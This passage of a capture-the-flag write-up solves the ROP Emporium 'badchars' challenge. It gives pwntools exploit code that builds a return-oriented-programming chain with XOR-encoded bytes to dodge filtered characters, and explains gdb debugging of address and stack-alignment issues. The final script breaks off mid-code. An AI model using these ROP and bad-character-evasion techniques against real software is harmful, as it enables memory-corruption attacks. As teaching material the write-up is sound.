</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">55
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#76a9f9>pwn</span> <span style=color:#c678dd>import</span> <span style=color:#c7bf54>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>elf</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>ELF</span>(<span style=color:#98c379>&#39;./badchars&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#c1abea>p</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>process</span>(<span style=color:#98c379>&#39;./badchars&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8a93a5;font-style:italic># 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span>
</span></span><span style=display:flex><span><span style=color:#8a93a5;font-style:italic># 0x0000000000400634 : mov qword ptr [r13], r12 ; ret</span>
</span></span><span style=display:flex><span><span style=color:#8a93a5;font-style:italic># 0x00000000004006a0 : pop r14 ; pop r15 ; ret</span>
</span></span><span style=display:flex><span><span style=color:#8a93a5;font-style:italic># 0x0000000000400628 : xor byte ptr [r15], r14b ; ret</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>CHUNKSIZE</span> <span style=color:#c7bf54>=</span> <span style=color:#d19a66>8</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>r</span> <span style=color:#c7bf54>=</span> <span style=color:#d19a66>100</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#00b1f7>write_str</span>(<span style=color:#c1abea>target</span>, <span style=color:#ef8383>str</span>, <span style=color:#c1abea>badchars</span><span style=color:#c7bf54>=</span>[]):
</span></span><span style=display:flex><span>    <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>=</span> <span style=color:#98c379>b</span><span style=color:#98c379>&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#c1abea>chunks</span> <span style=color:#c7bf54>=</span> [<span style=color:#ef8383>str</span>[<span style=color:#c1abea>i</span>:<span style=color:#c1abea>i</span><span style=color:#c7bf54>+</span><span style=color:#c1abea>CHUNKSIZE</span>]<span style=color:#c7bf54>.</span><span style=color:#c1abea>encode</span>() <span style=color:#c678dd>for</span> <span style=color:#c1abea>i</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#ef8383>range</span>(<span style=color:#d19a66>0</span>, <span style=color:#ef8383>len</span>(<span style=color:#ef8383>str</span>), <span style=color:#c1abea>CHUNKSIZE</span>)]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#c1abea>i</span>, <span style=color:#c1abea>chunk</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#ef8383>enumerate</span>(<span style=color:#c1abea>chunks</span>):
</span></span><span style=display:flex><span>        <span style=color:#c1abea>rchunk</span> <span style=color:#c7bf54>=</span> <span style=color:#98c379>b</span><span style=color:#98c379>&#39;&#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>r_indexes</span> <span style=color:#c7bf54>=</span> []
</span></span><span style=display:flex><span>        <span style=color:#c678dd>for</span> <span style=color:#c1abea>j</span>, <span style=color:#c1abea>c</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#ef8383>enumerate</span>(<span style=color:#c1abea>chunk</span>):
</span></span><span style=display:flex><span>            <span style=color:#c678dd>if</span> <span style=color:#ef8383>chr</span>(<span style=color:#c1abea>c</span>) <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#c1abea>badchars</span>: <span style=color:#8a93a5;font-style:italic># keep track of which indexes we need to xor later</span>
</span></span><span style=display:flex><span>                <span style=color:#c1abea>rchunk</span> <span style=color:#c7bf54>+=</span> <span style=color:#ef8383>bytes</span>([<span style=color:#c1abea>c</span> <span style=color:#c7bf54>^</span> <span style=color:#c1abea>r</span>])
</span></span><span style=display:flex><span>                <span style=color:#c1abea>r_indexes</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>append</span>(<span style=color:#c1abea>j</span>)
</span></span><span style=display:flex><span>            <span style=color:#c678dd>else</span>:
</span></span><span style=display:flex><span>                <span style=color:#c1abea>rchunk</span> <span style=color:#c7bf54>+=</span> <span style=color:#ef8383>bytes</span>([<span style=color:#c1abea>c</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#8a93a5;font-style:italic># 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#d19a66>0x40069c</span>)
</span></span><span style=display:flex><span>        <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>rchunk</span>                       <span style=color:#8a93a5;font-style:italic># r12</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#c1abea>target</span> <span style=color:#c7bf54>+</span> <span style=color:#c1abea>i</span> <span style=color:#c7bf54>*</span> <span style=color:#c1abea>CHUNKSIZE</span>)  <span style=color:#8a93a5;font-style:italic># r13</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#98c379>b</span><span style=color:#98c379>&#39;</span><span style=color:#d26464;font-weight:700>\x00</span><span style=color:#98c379>&#39;</span> <span style=color:#c7bf54>*</span> <span style=color:#d19a66>8</span>                  <span style=color:#8a93a5;font-style:italic># r14</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#98c379>b</span><span style=color:#98c379>&#39;</span><span style=color:#d26464;font-weight:700>\x00</span><span style=color:#98c379>&#39;</span> <span style=color:#c7bf54>*</span> <span style=color:#d19a66>8</span>                  <span style=color:#8a93a5;font-style:italic># r15</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#8a93a5;font-style:italic># 0x0000000000400634 : mov qword ptr [r13], r12 ; ret</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#d19a66>0x400634</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#8a93a5;font-style:italic># 0x00000000004006a0 : pop r14 ; pop r15 ; ret</span>
</span></span><span style=display:flex><span>        <span style=color:#8a93a5;font-style:italic># 0x0000000000400628 : xor byte ptr [r15], r14b ; ret</span>
</span></span><span style=display:flex><span>        <span style=color:#c678dd>for</span> <span style=color:#c1abea>j</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#c1abea>r_indexes</span>:
</span></span><span style=display:flex><span>            <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#d19a66>0x4006a0</span>)
</span></span><span style=display:flex><span>            <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#ef8383>bytes</span>([<span style=color:#c1abea>r</span>])<span style=color:#c7bf54>.</span><span style=color:#c1abea>ljust</span>(<span style=color:#d19a66>8</span>, <span style=color:#98c379>b</span><span style=color:#98c379>&#39;</span><span style=color:#d26464;font-weight:700>\x00</span><span style=color:#98c379>&#39;</span>)     <span style=color:#8a93a5;font-style:italic># r14</span>
</span></span><span style=display:flex><span>            <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#c1abea>target</span> <span style=color:#c7bf54>+</span> <span style=color:#c1abea>i</span> <span style=color:#c7bf54>*</span> <span style=color:#c1abea>CHUNKSIZE</span> <span style=color:#c7bf54>+</span> <span style=color:#c1abea>j</span>)  <span style=color:#8a93a5;font-style:italic># r15</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#d19a66>0x400628</span>)                    <span style=color:#8a93a5;font-style:italic># xor gadget</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#c1abea>payload</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>=</span> <span style=color:#98c379>b</span><span style=color:#98c379>&#39;A&#39;</span> <span style=color:#c7bf54>*</span> <span style=color:#d19a66>0x28</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>write_str</span>(<span style=color:#c1abea>elf</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>symbols</span>[<span style=color:#98c379>&#39;__data_start&#39;</span>], <span style=color:#98c379>&#39;flag.txt&#39;</span>, [<span style=color:#98c379>&#39;.&#39;</span>, <span style=color:#98c379>&#39;x&#39;</span>, <span style=color:#98c379>&#39;g&#39;</span>, <span style=color:#98c379>&#39;a&#39;</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#d19a66>0x4006a3</span>) <span style=color:#8a93a5;font-style:italic># pop rdi ; ret</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#c1abea>elf</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>symbols</span>[<span style=color:#98c379>&#39;__data_start&#39;</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#c1abea>elf</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>symbols</span>[<span style=color:#98c379>&#39;print_file&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#8a93a5;font-style:italic># dump payload to local file or send to remote</span>
</span></span></code></pre></td></tr></table></div></div><p>However, if we try to run this, it fails. We get a segfault, and no flag is printed. That&rsquo;s weird, what&rsquo;s going on?</p><h3 id=step-by-step>Step by step</h3><p>Running the payload inside <code>gdb</code> (<code>run &lt; payload</code>), we can see where our ropchain starts:
<img src=/img/writeups/2023/upsolving/pwn-progress-2/ropchainstart.png alt="breakpoint at 0x7ffff7c00a06 <pwnme+268>      ret"></p><p>We can see that after the <code>ret</code>, we&rsquo;ll be inside the <code>pop r12; pop r13; ...</code> gadget. This is where we load the <code>xor</code>ed string into memory.</p><p>Stepping through, eventually we reach our <code>xor</code> gadgets:
<img src=/img/writeups/2023/upsolving/pwn-progress-2/ropchainxorstart.png alt="gadget at 0x400628 <usefulGadgets+0> xor    BYTE PTR [r15], r14b"></p><p>You can see that the stack has pointers to <code>data_start+x</code>, indicating which characters we need to <code>xor</code>. However, the last gadget seems off:
<img src=/img/writeups/2023/upsolving/pwn-progress-2/ropchainbadxor.png alt="last xor gadget has address at 0x000000006010eb instead of data_start + x"></p><p>It seems to be pointing too far ahead? What&rsquo;s going on here?</p><p>Well, remember part 2 of the things to keep in mind? The bad characters can&rsquo;t be present at any part of the payload, <em>including</em> the addresses we use.</p><p>It turns out that the position of <code>x</code> in <code>flag.txt</code> <strong>just happens to be at such a bad address</strong>. So when we try to load in its address to be <code>xor</code>ed, the bad character will get replaced with <code>0xeb</code>, and the address will be wrong.</p><p>To fix this, we can just shift the string over by one character, since neither of the <code>t</code>s are banned. So instead of writing to <code>data_start</code>, we&rsquo;ll write to <code>data_start + 1</code>.</p><p>Unfortunately with this issue fixed, we <em>still</em> can&rsquo;t get the flag.</p><h3 id=oh-right-this-is-x64>Oh right this is x64</h3><p>If you&rsquo;ve done other parts of the ROP Emporium challenges, or just any x64 ROP in general, you&rsquo;ll probably know what the issue is.</p><p>Because the binary is in x64, some functions require the stack to be 16-byte aligned. Unfortunately, because we&rsquo;ve been messing with the stack so much, our payload unaligns the stack, and the <code>print_file</code> function fails.</p><p>To fix this, we can just plug a simple <code>ret</code> gadget into the end of our payload. This gadget:</p><pre tabindex=0><code>0x00000000004004ee : ret
</code></pre><p>will work just fine.</p><h3 id=final-solution>Final solution</h3><p>Here&rsquo;s the final exploit:</p><p>filename=solve.py</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">58
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#76a9f9>pwn</span> <span style=color:#c678dd>import</span> <span style=color:#c7bf54>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>elf</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>ELF</span>(<span style=color:#98c379>&#39;./badchars&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#c1abea>p</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>process</span>(<span style=color:#98c379>&#39;./badchars&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8a93a5;font-style:italic># 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span>
</span></span><span style=display:flex><span><span style=color:#8a93a5;font-style:italic># 0x0000000000400634 : mov qword ptr [r13], r12 ; ret</span>
</span></span><span style=display:flex><span><span style=color:#8a93a5;font-style:italic># 0x00000000004006a0 : pop r14 ; pop r15 ; ret</span>
</span></span><span style=display:flex><span><span style=color:#8a93a5;font-style:italic># 0x0000000000400628 : xor byte ptr [r15], r14b ; ret</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>CHUNKSIZE</span> <span style=color:#c7bf54>=</span> <span style=color:#d19a66>8</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>r</span> <span style=color:#c7bf54>=</span> <span style=color:#d19a66>100</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#00b1f7>write_str</span>(<span style=color:#c1abea>target</span>, <span style=color:#ef8383>str</span>, <span style=color:#c1abea>badchars</span><span style=color:#c7bf54>=</span>[]):
</span></span><span style=display:flex><span>    <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>=</span> <span style=color:#98c379>b</span><span style=color:#98c379>&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#c1abea>chunks</span> <span style=color:#c7bf54>=</span> [<span style=color:#ef8383>str</span>[<span style=color:#c1abea>i</span>:<span style=color:#c1abea>i</span><span style=color:#c7bf54>+</span><span style=color:#c1abea>CHUNKSIZE</span>]<span style=color:#c7bf54>.</span><span style=color:#c1abea>encode</span>() <span style=color:#c678dd>for</span> <span style=color:#c1abea>i</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#ef8383>range</span>(<span style=color:#d19a66>0</span>, <span style=color:#ef8383>len</span>(<span style=color:#ef8383>str</span>), <span style=color:#c1abea>CHUNKSIZE</span>)]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#c1abea>i</span>, <span style=color:#c1abea>chunk</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#ef8383>enumerate</span>(<span style=color:#c1abea>chunks</span>):
</span></span><span style=display:flex><span>        <span style=color:#c1abea>rchunk</span> <span style=color:#c7bf54>=</span> <span style=color:#98c379>b</span><span style=color:#98c379>&#39;&#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>r_indexes</span> <span style=color:#c7bf54>=</span> []
</span></span><span style=display:flex><span>        <span style=color:#c678dd>for</span> <span style=color:#c1abea>j</span>, <span style=color:#c1abea>c</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#ef8383>enumerate</span>(<span style=color:#c1abea>chunk</span>):
</span></span><span style=display:flex><span>            <span style=color:#c678dd>if</span> <span style=color:#ef8383>chr</span>(<span style=color:#c1abea>c</span>) <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#c1abea>badchars</span>: <span style=color:#8a93a5;font-style:italic># keep track of which indexes we need to xor later</span>
</span></span><span style=display:flex><span>                <span style=color:#c1abea>rchunk</span> <span style=color:#c7bf54>+=</span> <span style=color:#ef8383>bytes</span>([<span style=color:#c1abea>c</span> <span style=color:#c7bf54>^</span> <span style=color:#c1abea>r</span>])
</span></span><span style=display:flex><span>                <span style=color:#c1abea>r_indexes</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>append</span>(<span style=color:#c1abea>j</span>)
</span></span><span style=display:flex><span>            <span style=color:#c678dd>else</span>:
</span></span><span style=display:flex><span>                <span style=color:#c1abea>rchunk</span> <span style=color:#c7bf54>+=</span> <span style=color:#ef8383>bytes</span>([<span style=color:#c1abea>c</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#8a93a5;font-style:italic># 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#d19a66>0x40069c</span>)
</span></span><span style=display:flex><span>        <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>rchunk</span>                       <span style=color:#8a93a5;font-style:italic># r12</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#c1abea>target</span> <span style=color:#c7bf54>+</span> <span style=color:#c1abea>i</span> <span style=color:#c7bf54>*</span> <span style=color:#c1abea>CHUNKSIZE</span>)  <span style=color:#8a93a5;font-style:italic># r13</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#98c379>b</span><span style=color:#98c379>&#39;</span><span style=color:#d26464;font-weight:700>\x00</span><span style=color:#98c379>&#39;</span> <span style=color:#c7bf54>*</span> <span style=color:#d19a66>8</span>                  <span style=color:#8a93a5;font-style:italic># r14</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#98c379>b</span><span style=color:#98c379>&#39;</span><span style=color:#d26464;font-weight:700>\x00</span><span style=color:#98c379>&#39;</span> <span style=color:#c7bf54>*</span> <span style=color:#d19a66>8</span>                  <span style=color:#8a93a5;font-style:italic># r15</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#8a93a5;font-style:italic># 0x0000000000400634 : mov qword ptr [r13], r12 ; ret</span>
</span></span><span style=display:flex><span>        <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#d19a66>0x400634</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#8a93a5;font-style:italic># 0x00000000004006a0 : pop r14 ; pop r15 ; ret</span>
</span></span><span style=display:flex><span>        <span style=color:#8a93a5;font-style:italic># 0x0000000000400628 : xor byte ptr [r15], r14b ; ret</span>
</span></span><span style=display:flex><span>        <span style=color:#c678dd>for</span> <span style=color:#c1abea>j</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#c1abea>r_indexes</span>:
</span></span><span style=display:flex><span>            <span style=color:#c1abea>payload</span> <span style=color:#c7bf54>+=</span> <span style=color:#c1abea>p64</span>(<span style=color:#d19a66>0x4006a0</span>)
